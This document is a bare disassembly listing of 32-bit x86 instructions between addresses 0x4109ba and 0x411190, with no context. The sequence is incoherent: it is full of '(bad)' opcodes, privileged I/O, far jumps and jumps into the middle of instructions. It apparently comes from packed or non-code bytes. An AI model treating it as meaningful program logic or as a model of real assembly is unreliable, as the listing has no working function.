  4109ba:	ror    BYTE PTR [edx-0x39],cl
  4109bd:	jmp    0x41096b
  4109bf:	or     al,BYTE PTR ds:0xb4b9857e
  4109c5:	push   es
  4109c6:	jb     0x41096d
  4109c8:	out    dx,eax
  4109c9:	fdivp  st(1),st
  4109cb:	pop    edi
  4109cc:	sub    DWORD PTR ds:0xdb36be03,0x30f2e4c9
  4109d6:	in     al,dx
  4109d7:	leave  
  4109d8:	hlt    
  4109d9:	mov    al,ds:0x1e055743
  4109de:	stos   BYTE PTR es:[edi],al
  4109df:	lahf   
  4109e0:	test   DWORD PTR [edi-0x2e51bca9],0x192fe504
  4109ea:	mov    DWORD PTR [edx+0x5dee78ff],eax
  4109f0:	imul   BYTE PTR [eax+0x1a29b004]
  4109f6:	sub    ah,BYTE PTR [ebp+0x3520db12]
  4109fc:	push   0x44
  4109fe:	cmp    eax,0x30bd4184
  410a03:	jae    0x4109dd
  410a05:	jbe    0x41098d
  410a07:	jecxz  0x410a2f
  410a09:	or     DWORD PTR [ecx],ebx
  410a0b:	fnstsw WORD PTR [ebx-0x7f]
  410a0e:	mov    cl,0xd0
  410a10:	cli    
  410a11:	or     al,0x20
  410a14:	aam    0xd
  410a16:	xchg   esp,eax
  410a17:	gs dec ebp
  410a19:	sbb    al,0xcc
  410a1b:	pop    ecx
  410a1c:	loopne 0x41099f
  410a1e:	jb     0x410a5f
  410a20:	dec    ebp
  410a21:	or     eax,0xf2ae83f3
  410a26:	mov    bh,0xbf
  410a28:	jns    0x4109d9
  410a2a:	push   eax
  410a2b:	ss mov edx,0x37cf00e9
  410a31:	fcomi  st,st(3)
  410a33:	arpl   si,di
  410a35:	dec    esp
  410a36:	cmp    al,0x72
  410a38:	ss call 0x15510f6c
  410a3e:	arpl   WORD PTR [edi],si
  410a40:	imul   eax,DWORD PTR [ecx],0x34
  410a43:	dec    eax
  410a44:	sbb    eax,0x9be2724a
  410a49:	or     ebp,DWORD PTR [eax+0x1]
  410a4c:	dec    esi
  410a4d:	cs or  edi,DWORD PTR ss:[ebp-0xf]
  410a52:	mov    esp,0x92d6abda
  410a57:	stos   DWORD PTR es:[edi],eax
  410a58:	jl     0x410aa2
  410a5a:	add    BYTE PTR [eax-0x2],bl
  410a5d:	xchg   BYTE PTR [edi-0xc0d0624],al
  410a63:	cmp    al,0x5b
  410a65:	cmp    DWORD PTR [ebx+0x75],ecx
  410a68:	rcl    DWORD PTR [esi-0x3ff91bfd],0x17
  410a6f:	cmp    al,0x51
  410a71:	push   ss
  410a72:	arpl   WORD PTR [esp+eax*1+0x7565424f],bp
  410a79:	(bad)  
  410a7a:	dec    edi
  410a7b:	xchg   BYTE PTR [ebx+0x37ebee41],ch
  410a81:	cmp    al,0xf3
  410a83:	jp     0x410a42
  410a85:	popf   
  410a86:	ror    DWORD PTR [edi+0x2e],1
  410a89:	or     esi,ecx
  410a8b:	(bad)  
  410a8c:	sub    eax,0xcc091c67
  410a91:	push   ebp
  410a92:	and    DWORD PTR [esi+ebp*1],0xfa2cfabf
  410a99:	repnz xchg esi,eax
  410a9b:	sbb    dl,BYTE PTR [esi]
  410a9d:	mov    ebx,edx
  410a9f:	mov    al,0xc4
  410aa1:	pop    edi
  410aa2:	in     al,0x55
  410aa4:	inc    eax
  410aa5:	adc    BYTE PTR [eax-0x51],dl
  410aa8:	add    ecx,DWORD PTR [esi+0x70a79f29]
  410aae:	xlat   BYTE PTR ds:[ebx]
  410aaf:	lds    esp,FWORD PTR [edi+0x75]
  410ab2:	xchg   BYTE PTR [ecx],bh
  410ab4:	mov    dh,0x1f
  410ab6:	pop    ss
  410ab7:	call   0x946ab57c
  410abc:	mov    ebp,0xb1b7e735
  410ac1:	mov    cl,0xd6
  410ac3:	pop    eax
  410ac4:	retf   
  410ac5:	dec    ecx
  410ac6:	pop    esi
  410ac7:	mov    ds:0x30a53dc0,al
  410acc:	ret    
  410acd:	and    DWORD PTR [esi+0x62],0x6a1c2a04
  410ad4:	xor    DWORD PTR [esi+0x5],ecx
  410ad7:	popa   
  410ad8:	push   edx
  410ad9:	jmp    0x410b1a
  410adb:	fs pop esi
  410add:	pop    eax
  410ade:	outs   dx,BYTE PTR ds:[esi]
  410adf:	lods   eax,DWORD PTR ds:[esi]
  410ae0:	add    al,BYTE PTR [ecx-0x67]
  410ae3:	mov    ah,0xa5
  410ae5:	fistp  WORD PTR [eax+eiz*8-0x47caafc0]
  410aec:	test   eax,0xbab16160
  410af1:	xchg   ebp,eax
  410af2:	call   0x97eb08d3
  410af7:	retf   
  410af8:	push   es
  410af9:	inc    ebx
  410afa:	inc    ebp
  410afb:	xor    al,0xd0
  410afd:	add    bh,bl
  410aff:	push   cs
  410b00:	bound  ecx,QWORD PTR [edi+0x76]
  410b03:	or     al,0x1d
  410b05:	rcr    DWORD PTR [ecx-0x465cf2ba],0xdc
  410b0c:	push   es
  410b0d:	sub    al,0x87
  410b0f:	setnp  BYTE PTR [ebx]
  410b12:	aad    0x53
  410b14:	es cmp eax,0x4c3ef896
  410b1a:	jmp    0x3110:0xe10069d8
  410b21:	push   cs
  410b22:	das    
  410b23:	test   al,0xec
  410b25:	inc    esp
  410b26:	imul   BYTE PTR [edx+edx*2]
  410b29:	loop   0x410b6c
  410b2b:	and    esi,DWORD PTR [eax+0x54]
  410b2e:	mov    al,ds:0xa9397a4c
  410b33:	out    dx,eax
  410b34:	cmp    eax,0x75edd3cc
  410b39:	push   es
  410b3a:	pavgw  mm3,mm0
  410b3d:	pop    edi
  410b3e:	imul   edx,DWORD PTR [eax],0xffffff87
  410b41:	pop    esp
  410b42:	popf   
  410b43:	mov    esi,0xc2b7e1a9
  410b48:	jbe    0x410b86
  410b4a:	xor    al,0x35
  410b4c:	fldcw  WORD PTR [esi+eiz*1]
  410b4f:	and    al,0xaf
  410b51:	ins    BYTE PTR es:[edi],dx
  410b52:	add    eax,0x64c210b9
  410b57:	add    ecx,DWORD PTR [edx-0x33]
  410b5a:	add    DWORD PTR [edi+0x15ab1f06],edi
  410b60:	add    BYTE PTR [ecx+0x13],dl
  410b63:	repz aaa 
  410b65:	jnp    0x410b91
  410b67:	mov    bh,BYTE PTR [eax-0x7e]
  410b6a:	popf   
  410b6b:	js     0x410bd1
  410b6d:	and    BYTE PTR ds:0x7d9d14a1,bl
  410b73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b74:	ss out dx,eax
  410b76:	mov    edx,edx
  410b78:	inc    ecx
  410b79:	inc    ebp
  410b7a:	xor    eax,0xef493ea3
  410b7f:	inc    esi
  410b81:	mov    ah,0x69
  410b83:	push   ebp
  410b84:	mov    ds:0x29d00491,al
  410b89:	sbb    ch,bl
  410b8b:	sub    BYTE PTR [ebx],bh
  410b8d:	mov    ds:0x4c944e9a,eax
  410b92:	mov    al,ds:0xd966ea02
  410b97:	jmp    0x410b73
  410b99:	or     edx,DWORD PTR [edi]
  410b9b:	rcl    DWORD PTR [ebp-0x43],0xb
  410b9f:	mov    esp,0x970c78a8
  410ba4:	jbe    0x410c17
  410ba6:	pop    edi
  410ba7:	push   eax
  410ba8:	out    dx,al
  410ba9:	and    eax,0x5279ba7
  410bae:	(bad)  
  410baf:	aam    0xba
  410bb1:	and    eax,0x38cf0fab
  410bb6:	xor    ah,BYTE PTR [ecx-0x573d4452]
  410bbc:	ins    DWORD PTR es:[edi],dx
  410bbd:	imul   edx,DWORD PTR [eax],0xd058f529
  410bc3:	mov    esp,0x26cc9ca4
  410bc8:	stos   DWORD PTR es:[edi],eax
  410bc9:	test   DWORD PTR ds:0xe6336150,esp
  410bcf:	jmp    0xb6fbc905
  410bd4:	xchg   bp,ax
  410bd6:	xlat   BYTE PTR ds:[ebx]
  410bd7:	popf   
  410bd8:	cmp    dl,BYTE PTR [eax-0x7]
  410bdb:	add    bl,BYTE PTR [ebx]
  410bdd:	push   ecx
  410bde:	inc    edi
  410bdf:	outs   dx,BYTE PTR ds:[esi]
  410be0:	lods   al,BYTE PTR ds:[esi]
  410be1:	pop    edi
  410be2:	xchg   ecx,eax
  410be3:	cs out dx,al
  410be5:	pop    es
  410be6:	sbb    bh,0x9c
  410be9:	jne    0x410c20
  410beb:	out    dx,eax
  410bec:	ins    DWORD PTR es:[edi],dx
  410bed:	int    0xd9
  410bef:	cmovo  eax,ecx
  410bf2:	fs in  eax,dx
  410bf4:	into   
  410bf5:	fwait
  410bf6:	mov    cl,dh
  410bf8:	mov    dh,0x81
  410bfa:	outs   dx,BYTE PTR ds:[esi]
  410bfb:	dec    esp
  410bfc:	and    al,0x43
  410bfe:	int3   
  410bff:	mov    ebx,0xdbb512f4
  410c04:	cdq    
  410c05:	imul   BYTE PTR [ebx]
  410c07:	fisub  DWORD PTR [edi]
  410c09:	mov    esi,0x60acbb01
  410c0e:	mov    bh,0x1f
  410c10:	lods   eax,DWORD PTR ds:[esi]
  410c11:	jge    0x410bd0
  410c13:	mov    ecx,0x9326e64c
  410c18:	dec    eax
  410c19:	addr16 and eax,0x1f58f049
  410c1f:	mov    dl,0x8a
  410c21:	add    dh,BYTE PTR [eax-0x80]
  410c24:	fild   WORD PTR [esp+eax*4+0x47]
  410c28:	sahf   
  410c29:	rol    BYTE PTR [edi],0xa0
  410c2c:	or     cl,BYTE PTR [ecx-0x4c]
  410c2f:	xlat   BYTE PTR ds:[ebx]
  410c30:	push   0xfffffffb
  410c32:	(bad)  
  410c34:	retf   0x1657
  410c37:	imul   edx,DWORD PTR [ebx+0x7e],0x96a456c4
  410c3e:	sub    ch,cl
  410c40:	iret   
  410c41:	inc    edx
  410c42:	sub    al,0x44
  410c44:	push   ebp
  410c45:	inc    ecx
  410c46:	inc    ebp
  410c47:	stos   BYTE PTR es:[edi],al
  410c48:	sbb    bl,BYTE PTR [edi]
  410c4a:	or     edx,DWORD PTR [ebx+0x61]
  410c4d:	sbb    BYTE PTR [edi],bh
  410c4f:	mov    ebx,0x71c8be02
  410c54:	aad    0x24
  410c56:	adc    al,0xbf
  410c58:	cmc    
  410c59:	dec    esi
  410c5a:	xor    DWORD PTR [edi-0x64],0xffffffd4
  410c5e:	sar    edx,1
  410c60:	test   DWORD PTR [ecx],ecx
  410c62:	xlat   BYTE PTR ds:[ebx]
  410c63:	xor    edi,esp
  410c65:	mov    eax,0x2ae7d7ae
  410c6a:	push   esi
  410c6b:	mov    BYTE PTR [esi-0x53ef46f7],cl
  410c71:	imul   ebp,DWORD PTR [edi+0x76406db9],0x5d6d6be1
  410c7b:	pushf  
  410c7c:	push   0xc883ab41
  410c81:	out    dx,al
  410c82:	inc    ebx
  410c83:	icebp  
  410c84:	push   edi
  410c85:	clc    
  410c86:	and    dh,bh
  410c88:	(bad)  
  410c89:	mov    esp,0xdca2bf7a
  410c8e:	mov    cs,WORD PTR [edi-0x7e685e48]
  410c94:	mov    edi,0x6d8674be
  410c99:	(bad)  
  410c9a:	dec    esp
  410c9b:	pop    ds
  410c9c:	lds    edi,FWORD PTR [eax]
  410c9e:	pop    esi
  410c9f:	mov    esp,0xde608ee2
  410ca4:	out    dx,eax
  410ca5:	xchg   edi,eax
  410ca6:	(bad)  
  410ca8:	pop    es
  410ca9:	sub    ecx,ebp
  410cab:	(bad)  
  410cad:	adc    dl,BYTE PTR [bp+di+0x7c02]
  410cb2:	into   
  410cb3:	push   0x20
  410cb5:	clc    
  410cb6:	dec    ecx
  410cb7:	sub    edx,edx
  410cb9:	inc    eax
  410cba:	xchg   ebp,eax
  410cbb:	mov    bh,ch
  410cbd:	call   0xabfe:0xe7df3634
  410cc4:	rol    BYTE PTR [eax+esi*4+0x1a4776d5],cl
  410ccb:	ret    0x3d6d
  410cce:	repz pop edi
  410cd0:	retf   
  410cd1:	clc    
  410cd2:	popf   
  410cd3:	retf   
  410cd4:	(bad)  
  410cd5:	dec    ebp
  410cd6:	jne    0x410d00
  410cd8:	loopne 0x410c62
  410cda:	dec    esi
  410cdb:	cli    
  410cdc:	cmp    esi,ebx
  410cde:	xor    ebx,DWORD PTR [esi]
  410ce0:	inc    ebp
  410ce1:	fs pop ebx
  410ce3:	inc    esi
  410ce4:	pusha  
  410ce5:	mov    ecx,0x2321949e
  410cea:	lods   al,BYTE PTR ds:[esi]
  410ceb:	(bad)
  410cee:	or     ecx,DWORD PTR [ecx+0x5c]
  410cf1:	shl    DWORD PTR [ebx+eiz*2+0x65e69820],cl
  410cf8:	lods   eax,DWORD PTR ds:[esi]
  410cf9:	push   cs
  410cfa:	xchg   DWORD PTR [eax+edi*2],ebp
  410cfd:	jne    0x410d7d
  410cff:	nop
  410d00:	(bad)  
  410d01:	jg     0x410d56
  410d03:	push   ebx
  410d04:	lahf   
  410d05:	pop    ss
  410d06:	pop    ecx
  410d07:	fimul  DWORD PTR [ebp-0x22560a7d]
  410d0d:	jno    0x410ca7
  410d0f:	rcr    BYTE PTR [ecx-0x552efac6],0x78
  410d16:	bound  eax,QWORD PTR [ebx]
  410d18:	mov    eax,0x82bf7dd4
  410d1d:	xor    eax,0x1c870091
  410d22:	cs inc edi
  410d24:	mov    ebx,0xd2862ba9
  410d29:	mov    bl,bh
  410d2b:	aaa    
  410d2c:	imul   ebp,DWORD PTR [ebp+ecx*2-0xe],0xffffff95
  410d31:	mov    esp,ecx
  410d33:	xchg   ebx,eax
  410d34:	push   0x18
  410d36:	mov    es,WORD PTR ss:[ebx]
  410d39:	div    ecx
  410d3b:	test   eax,0xd4f7070c
  410d40:	mov    DWORD PTR [esi+edi*8],esi
  410d43:	cli    
  410d44:	ds aaa 
  410d46:	mov    al,ds:0x414f0350
  410d4b:	into   
  410d4c:	adc    eax,0x544ce9b5
  410d51:	xchg   BYTE PTR [edi],cl
  410d53:	pusha  
  410d54:	gs jno 0x410d78
  410d57:	mov    al,0x3a
  410d59:	cmp    dl,bl
  410d5b:	lock in al,dx
  410d5d:	outs   dx,BYTE PTR ds:[esi]
  410d5e:	aaa    
  410d5f:	adc    eax,DWORD PTR [eax]
  410d61:	xor    ch,ah
  410d63:	fmul   DWORD PTR [esi]
  410d65:	imul   eax,DWORD PTR [eax-0x43],0xfd874d77
  410d6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d6d:	ja     0x410dc9
  410d6f:	ds xor esp,ebp
  410d72:	pop    es
  410d73:	xor    bl,BYTE PTR [ebp+0x60]
  410d76:	in     eax,dx
  410d77:	(bad)  
  410d78:	arpl   WORD PTR [edx],di
  410d7a:	(bad)  
  410d7b:	lahf   
  410d7c:	and    ecx,DWORD PTR [ebp+0x5b32d79c]
  410d82:	dec    esi
  410d83:	or     DWORD PTR [eax+0x7f151bc7],esi
  410d89:	adc    BYTE PTR [ebp+0x46],bl
  410d8c:	inc    eax
  410d8d:	mov    eax,0xc17ca7ef
  410d92:	ret    0x6f14
  410d95:	inc    ecx
  410d96:	pop    edx
  410d97:	push   esi
  410d98:	xchg   ebx,eax
  410d99:	mov    eax,ds:0xbe16ca3a
  410d9e:	inc    ebp
  410d9f:	mov    DWORD PTR [edx+0x4e3b03a6],esi
  410da5:	and    DWORD PTR [edx],eax
  410da7:	stos   DWORD PTR es:[edi],eax
  410da8:	push   ss
  410da9:	sahf   
  410daa:	std    
  410dab:	fdivr  QWORD PTR [edi]
  410dad:	mov    ds:0xbed4ee7a,al
  410db2:	mov    bh,0x58
  410db4:	out    0x90,al
  410db6:	imul   ebx,DWORD PTR [esi],0x32
  410db9:	cld    
  410dba:	inc    edx
  410dbb:	pop    es
  410dbc:	ins    DWORD PTR es:[edi],dx
  410dbd:	lds    ebx,FWORD PTR [ebx-0x4]
  410dc0:	or     dh,BYTE PTR [edi]
  410dc2:	ins    BYTE PTR es:[edi],dx
  410dc3:	adc    BYTE PTR [edx-0x26436262],dl
  410dc9:	cmc    
  410dca:	xchg   edx,eax
  410dcb:	xchg   esi,eax
  410dcc:	aad    0xbc
  410dce:	xor    eax,ebx
  410dd0:	mov    bh,cl
  410dd2:	and    esp,edx
  410dd4:	xor    edx,DWORD PTR [edx]
  410dd6:	les    esp,FWORD PTR ds:0x3e28fee6
  410ddc:	adc    esi,0x39
  410ddf:	jmp    0x410db5
  410de1:	and    bl,dl
  410de3:	mov    esi,0xb10705e3
  410de8:	ins    BYTE PTR es:[edi],dx
  410de9:	(bad)  [esi+0x6e]
  410dec:	out    dx,al
  410ded:	jb     0x410df5
  410def:	mov    esi,0xc70f3b5b
  410df4:	adc    DWORD PTR [ecx-0x71],ecx
  410df7:	xor    ecx,eax
  410df9:	sbb    edx,esp
  410dfb:	sbb    DWORD PTR [esi+0x6175a054],edi
  410e01:	adc    al,0xa1
  410e03:	dec    esp
  410e04:	push   ebp
  410e05:	stos   BYTE PTR es:[edi],al
  410e06:	pop    ecx
  410e07:	pop    edx
  410e08:	inc    ebx
  410e09:	es jbe 0x410e0f
  410e0c:	imul   edx,DWORD PTR [edi+ebx*2+0x4df4cd65],0xff5c46ce
  410e17:	(bad)  
  410e18:	hlt    
  410e19:	cmp    dl,BYTE PTR [ecx]
  410e1b:	adc    eax,0xcb69d35
  410e20:	outs   dx,DWORD PTR ds:[esi]
  410e21:	and    BYTE PTR [ebp+0x62],bh
  410e24:	mov    eax,0xc6c80f75
  410e29:	jl     0x410db7
  410e2b:	jp     0x410e06
  410e2d:	ins    DWORD PTR es:[edi],dx
  410e2e:	add    eax,0x8c74f665
  410e33:	inc    edx
  410e34:	lock pop esp
  410e36:	mov    ds:0x6e0959ed,eax
  410e3b:	icebp  
  410e3c:	std    
  410e3d:	xlat   BYTE PTR ds:[ebx]
  410e3e:	inc    ebx
  410e3f:	dec    esi
  410e40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e41:	aad    0xec
  410e43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e44:	mov    ch,0x3
  410e46:	in     al,dx
  410e47:	fcom   QWORD PTR [edx]
  410e49:	mov    ebp,0x9ab706a1
  410e4e:	mov    ss,WORD PTR [ecx+0x568bc88]
  410e54:	les    edx,FWORD PTR [eax+0x3d8dc3d2]
  410e5a:	and    edi,DWORD PTR [eax-0x77119e14]
  410e60:	mov    WORD PTR [edx+ebx*8],ds
  410e63:	dec    esi
  410e64:	sti    
  410e65:	sub    dl,ah
  410e67:	enter  0xd937,0xae
  410e6b:	sbb    eax,0xb39536b1
  410e70:	rol    BYTE PTR [esp+ecx*1+0x80a8bcc],0xf5
  410e78:	xor    eax,0x8325c8f8
  410e7e:	(bad)  
  410e7f:	mov    esp,0xee5c6df0
  410e84:	cmp    al,0x0
  410e86:	loope  0x410e75
  410e88:	mov    ebx,0x8ac3fcc4
  410e8d:	ficomp DWORD PTR ds:0x7b972163
  410e93:	test   BYTE PTR [edi-0x261cdb3b],ah
  410e99:	imul   esi,eax,0x6d3d9e
  410e9f:	retf   0x24b1
  410ea2:	pop    eax
  410ea3:	or     esi,DWORD PTR [edi+0x3b]
  410ea6:	sub    DWORD PTR [esi],edx
  410ea8:	push   ecx
  410ea9:	and    dl,BYTE PTR [edx+0x3b13b506]
  410eaf:	sub    eax,0x124118d0
  410eb4:	jnp    0x410ef1
  410eb6:	jno    0x410e69
  410eb8:	(bad)
  410ebc:	pop    es
  410ebd:	pop    ds
  410ebe:	xor    bh,BYTE PTR [ebx-0x6d]
  410ec1:	call   0x4f3af2b7
  410ec6:	xor    DWORD PTR ds:0x10ef259d,esi
  410ecc:	pop    eax
  410ecd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ece:	adc    BYTE PTR [ecx],cl
  410ed0:	inc    edi
  410ed1:	jb     0x410e6c
  410ed3:	mov    es,WORD PTR [esi-0x346e003d]
  410ed9:	mov    bh,0x65
  410edb:	retf   0x5ccb
  410ede:	dec    esp
  410edf:	adc    al,0xea
  410ee1:	mov    ds:0x575bea2b,eax
  410ee6:	loopne 0x410eed
  410ee8:	ret    
  410ee9:	fimul  DWORD PTR [ebp-0x435029d9]
  410eef:	inc    ecx
  410ef0:	cs das 
  410ef2:	idiv   BYTE PTR [ecx+0x2c141e31]
  410ef8:	repnz hlt 
  410efa:	and    DWORD PTR [ecx],0x939a905a
  410f00:	lds    ebx,FWORD PTR [ebp-0x51706395]
  410f06:	dec    esi
  410f07:	lock shl DWORD PTR [eax],0xae
  410f0b:	inc    ebx
  410f0c:	dec    edx
  410f0d:	push   ebp
  410f0e:	retf   0x6baa
  410f11:	sub    BYTE PTR [edx],0xa4
  410f14:	mov    BYTE PTR [ebx-0x60],ah
  410f17:	fcom   st(0)
  410f19:	adc    esi,DWORD PTR [esi]
  410f1b:	xchg   ecx,ebx
  410f1d:	fcom   DWORD PTR [esi+edi*2-0x5ee8b626]
  410f24:	dec    esp
  410f25:	adc    eax,0xb658f61
  410f2a:	xchg   ecx,eax
  410f2b:	jno    0x410edc
  410f2d:	and    al,0x64
  410f2f:	mov    ebx,0x6423e988
  410f34:	sub    al,0xe6
  410f36:	test   al,0xa1
  410f38:	daa    
  410f39:	not    eax
  410f3b:	ret    
  410f3c:	scas   al,BYTE PTR es:[edi]
  410f3d:	xlat   BYTE PTR ds:[ebx]
  410f3e:	popf   
  410f3f:	test   DWORD PTR [ecx+0x4b4b5316],ebx
  410f45:	push   eax
  410f46:	or     BYTE PTR [ebx+0x13],0x8f
  410f4a:	not    DWORD PTR [esi+ebx*2]
  410f4d:	push   ss
  410f4e:	inc    ebp
  410f4f:	aad    0x7c
  410f51:	stc    
  410f52:	jno    0x410fca
  410f54:	addr16 adc eax,0xc35f61d1
  410f5a:	pop    ebx
  410f5b:	sar    esp,1
  410f5d:	cmp    BYTE PTR [ecx-0xa72cdd2],0x6c
  410f64:	dec    ebx
  410f65:	shr    DWORD PTR [ecx-0x784c0886],1
  410f6b:	inc    edx
  410f6c:	mov    BYTE PTR [esi-0x4633397b],al
  410f72:	mov    ch,0x8d
  410f74:	pop    es
  410f75:	or     eax,0x645b4c2a
  410f7a:	fs arpl si,ax
  410f7d:	jp     0x410f40
  410f7f:	std    
  410f80:	mov    ds:0x7ae8a7f0,eax
  410f85:	and    cl,BYTE PTR [ebp+0x3d93732b]
  410f8b:	aas    
  410f8c:	pushf  
  410f8d:	push   ss
  410f8e:	aad    0x4e
  410f90:	lods   al,BYTE PTR ds:[esi]
  410f91:	jns    0x410fef
  410f93:	xchg   ebp,eax
  410f94:	dec    esi
  410f95:	cmp    BYTE PTR [edi+0x47],ch
  410f98:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  410f9a:	mov    edx,0x2d094bab
  410f9f:	or     eax,0x4ce4bb0b
  410fa4:	cmp    BYTE PTR [edi+0x6b7f0470],0x8
  410fab:	xchg   edi,eax
  410fac:	aaa    
  410fad:	or     eax,0xa8159f62
  410fb2:	inc    edi
  410fb3:	and    al,0xb9
  410fb5:	sbb    ecx,DWORD PTR [ecx-0x3c49eff9]
  410fbb:	adc    dh,0x7d
  410fbe:	cld    
  410fbf:	jb     0x411010
  410fc1:	into   
  410fc2:	outs   dx,BYTE PTR ds:[esi]
  410fc3:	adc    edi,DWORD PTR [ecx-0x31]
  410fc6:	retf   0x5994
  410fc9:	test   eax,0xb696a7e6
  410fce:	inc    BYTE PTR [ebx]
  410fd0:	std    
  410fd1:	shl    DWORD PTR [ebp-0x1b825ee],1
  410fd7:	sbb    esi,ebp
  410fd9:	fld    DWORD PTR [edx]
  410fdb:	xchg   DWORD PTR [ebp+0x48014800],edi
  410fe1:	sbb    eax,0x7d5a205a
  410fe6:	cmp    al,BYTE PTR [esi]
  410fe8:	out    0xe4,eax
  410fea:	xor    al,0x13
  410fec:	mov    DWORD PTR [ecx-0x32],ebp
  410fef:	vhsubps ymm7,ymm0,YMMWORD PTR [ebp+0x121a112b]
  410ff7:	ret    
  410ff8:	cwde   
  410ff9:	fild   DWORD PTR [eax+0x31]
  410ffc:	stos   DWORD PTR es:[edi],eax
  410ffd:	adc    eax,0xa027bd90
  411002:	nop
  411003:	mov    BYTE PTR [ebp+0x1a8295d5],ah
  411009:	pop    es
  41100a:	inc    ebx
  41100b:	mov    ebx,0xbd50eef6
  411010:	jecxz  0x411058
  411012:	rol    DWORD PTR [ecx+0x2bf6f304],1
  411018:	mov    ebp,0x92fab67a
  41101d:	or     bh,dl
  41101f:	dec    ecx
  411020:	xor    BYTE PTR [edi-0x1f97507],al
  411026:	jns    0x41109c
  411028:	xor    al,0x54
  41102a:	inc    ebx
  41102b:	mov    ebx,DWORD PTR [edx+ecx*4]
  41102e:	pop    es
  41102f:	iret   
  411030:	jnp    0x4110a1
  411032:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411033:	adc    BYTE PTR [ecx],bl
  411035:	lods   eax,DWORD PTR ds:[esi]
  411036:	mov    eax,0xf555f6c0
  41103b:	jle    0x41102e
  41103d:	sbb    DWORD PTR ds:0x5bcadef1,0xfffffff8
  411044:	sub    BYTE PTR [edx+0x25ff511a],0xa5
  41104b:	xchg   ecx,eax
  41104c:	dec    eax
  41104d:	dec    edi
  41104e:	out    0x54,eax
  411050:	aad    0x7b
  411052:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411053:	sbb    bl,0xa0
  411056:	jne    0x4110c6
  411058:	mov    ch,0xeb
  41105a:	std    
  41105b:	js     0x4110a6
  41105d:	mov    al,ds:0x2791170
  411062:	stc    
  411063:	arpl   WORD PTR [esi-0x6ac04574],di
  411069:	sub    ecx,ebx
  41106b:	push   esi
  41106c:	or     eax,0x2b62b6f0
  411071:	xor    ecx,DWORD PTR [ebp+0x616ab2f3]
  411077:	jmp    0x41107f
  411079:	retf   
  41107a:	loopne 0x4110ea
  41107c:	test   ebp,edx
  41107e:	add    esi,DWORD PTR [edi+0x5d3ac97f]
  411084:	cwde   
  411085:	jge    0x411012
  411087:	ret    
  411088:	mov    bh,0x17
  41108a:	sbb    DWORD PTR [ebx+0x51644d65],0xffffffd5
  411091:	cs ret 0x3e0e
  411095:	or     eax,0xd8fad2d9
  41109b:	xor    eax,0x2da513a9
  4110a0:	inc    edx
  4110a1:	ins    BYTE PTR es:[edi],dx
  4110a2:	mov    esi,0x8ab2d3a
  4110a7:	or     BYTE PTR [edi],0xcd
  4110aa:	and    ebx,esi
  4110ac:	retf   0xe34d
  4110af:	add    BYTE PTR [ebp-0x41],ch
  4110b2:	stos   BYTE PTR es:[edi],al
  4110b3:	push   ss
  4110b4:	push   esp
  4110b5:	imul   ecx,DWORD PTR [edx],0x92078f9
  4110bb:	cmp    esi,edx
  4110bd:	and    eax,0xe3bcd52f
  4110c2:	or     DWORD PTR [eax],ebp
  4110c4:	pop    ds
  4110c5:	daa    
  4110c6:	minps  xmm5,xmm5
  4110c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4110ca:	(bad)  
  4110cb:	(bad)  
  4110cc:	adc    DWORD PTR [eax-0x37689763],edx
  4110d2:	xchg   edi,eax
  4110d3:	aaa    
  4110d4:	(bad)  
  4110d5:	lahf   
  4110d6:	ds aam 0x92
  4110d9:	lahf   
  4110da:	sahf   
  4110db:	fadd   QWORD PTR [edx]
  4110dd:	xor    eax,0x79288b5
  4110e2:	dec    ebx
  4110e3:	adc    esp,DWORD PTR [eax+0x5e]
  4110e6:	add    al,0xd6
  4110e8:	pop    ebp
  4110e9:	ja     0x411092
  4110eb:	call   DWORD PTR es:[esi+edi*1-0xb56209e]
  4110f3:	push   esp
  4110f4:	(bad)  
  4110f5:	mov    esp,0xafd0b0d1
  4110fa:	ja     0x411149
  4110fc:	popf   
  4110fd:	std    
  4110fe:	jmp    0x31c3:0x464726f5
  411105:	sbb    ecx,DWORD PTR [edx]
  411107:	jmp    0x6edc0cf2
  41110c:	sbb    al,0x97
  41110e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41110f:	into   
  411110:	sahf   
  411111:	push   eax
  411112:	cwde   
  411113:	jns    0x411157
  411115:	call   0xd1af:0xaa81e76f
  41111c:	les    esp,FWORD PTR [eax-0x2f]
  41111f:	pop    ebx
  411120:	add    eax,ebp
  411122:	aad    0x3f
  411124:	xchg   eax,ebp
  411126:	in     eax,dx
  411127:	ffreep st(4)
  411129:	cmp    DWORD PTR [ebp+0x14],ebp
  41112c:	jecxz  0x411139
  41112e:	dec    ecx
  41112f:	test   eax,0x2396783c
  411134:	sbb    dh,al
  411136:	out    0xe8,al
  411138:	adc    DWORD PTR [esi],edx
  41113a:	xchg   edx,eax
  41113b:	pop    edi
  41113c:	xor    al,0xb0
  41113e:	je     0x41113d
  411140:	addr16 jo 0x4111c1
  411143:	jne    0x411116
  411145:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411146:	mov    ds:0x8390f038,al
  41114b:	popa   
  41114c:	cmp    ah,BYTE PTR [esi+0x40]
  41114f:	js     0x4110e1
  411151:	mov    ch,0xfb
  411153:	in     al,0x9c
  411155:	and    al,0xe9
  411157:	adc    al,0x57
  411159:	xchg   ebp,eax
  41115a:	push   eax
  41115b:	sub    DWORD PTR [edx+0x58a72042],esp
  411161:	add    ebx,DWORD PTR [ebx-0x38]
  411164:	mov    dl,BYTE PTR [ebp-0x2]
  411167:	(bad)  
  411169:	gs inc edi
  41116b:	pop    ss
  41116c:	mov    edi,0xa1116cef
  411171:	mov    edx,0xddf26cfa
  411176:	xchg   edx,eax
  411177:	scas   al,BYTE PTR es:[edi]
  411178:	push   eax
  411179:	mov    WORD PTR [esi+ecx*8-0x1d],ss
  41117d:	scas   al,BYTE PTR es:[edi]
  41117e:	adc    ebx,0x5dba1fbe
  411184:	je     0x4111cc
  411186:	add    bh,BYTE PTR [esi-0x2f]
  411189:	rcr    DWORD PTR [edx],cl
  41118b:	pop    ebx
  41118c:	inc    eax
  41118d:	jo     0x411204
  41118f:	stos   DWORD PTR es:[edi],eax
  411190:	push   ebx
